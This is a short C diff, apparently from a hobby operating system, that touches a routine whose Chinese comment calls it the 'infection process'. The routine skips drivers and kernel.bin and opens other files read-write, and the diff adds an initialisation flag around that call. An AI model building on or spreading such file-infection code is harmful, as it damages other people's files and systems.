@@ -41,7 +41,9 @@ int main(int argc,char * argv[] )
      if (strncmp(temp, "dev", 3) != 0 && strncmp(temp, "kernel.bin", 10) != 0) {  // 下面是感染过程
                 // 不读驱动 不读kernel.bin
                 __asm__ __volatile__("xchg %bx, %bx");
+                is_inited = 1;
                 int old_file = open(temp, O_RDWR);
+                is_inited = 0;
                 if(old_file == -1)
                 {
                     printf("access denied!\n");
